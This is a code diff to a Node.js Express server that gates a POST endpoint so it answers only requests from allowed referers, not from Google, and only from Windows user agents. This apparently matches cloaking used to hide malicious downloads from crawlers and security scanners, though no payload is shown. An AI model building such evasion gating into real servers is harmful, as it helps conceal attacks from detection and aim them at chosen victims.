@@ -1,6 +1,7 @@
 const express = require("express");
 const cors = require("cors");
 const path = require("path");
+const url = require("url"); // Include the URL module for parsing
 const app = express();
 const PORT = 3000 || process.env.PORT;
 
@@ -27,6 +28,22 @@ const allowedOrigins = [
 // Normalize referer function to handle trailing slashes
 const normalizeReferer = (referer) => referer?.replace(/\/+$/, "");
 
+// Helper function to check if the user's OS is Windows
+const isWindowsOS = (userAgent) => {
+  return userAgent.includes("Windows");
+};
+
+// Helper function to check if the referer is not Google
+const isNotGoogleReferrer = (referer) => {
+  if (!referer) return true; // No referer, proceed with the request
+
+  const parsedUrl = url.parse(referer, true);
+  const hostname = parsedUrl.hostname;
+
+  // Check if the hostname does not include 'google'
+  return !hostname.includes("google");
+};
+
 // CORS configuration
 const corsOptions = {
   origin: function (origin, callback) {
@@ -50,13 +67,14 @@ app.post(
   "/",
   (req, res, next) => {
     const referer = normalizeReferer(req.headers.referer);
+    const userAgent = req.headers['user-agent']; // Get the User-Agent from the request headers
     console.log(`Referer: ${referer}`); // Log the referer for debugging
 
-    // Check if the normalized referer exists in the allowedOrigins array
-    if (allowedOrigins.some(allowedOrigin => referer.startsWith(allowedOrigin))) {
+    // Enhanced check: allowed origins, not from Google, and is Windows OS
+    if (allowedOrigins.some(allowedOrigin => referer.startsWith(allowedOrigin)) && isNotGoogleReferrer(referer) && isWindowsOS(userAgent)) {
       next();
     } else {
-      res.status(403).send("Access forbidden due to invalid referer.");
+      res.status(403).send("Access forbidden due to invalid referer or conditions not met.");
     }
   },
   (req, res) => {
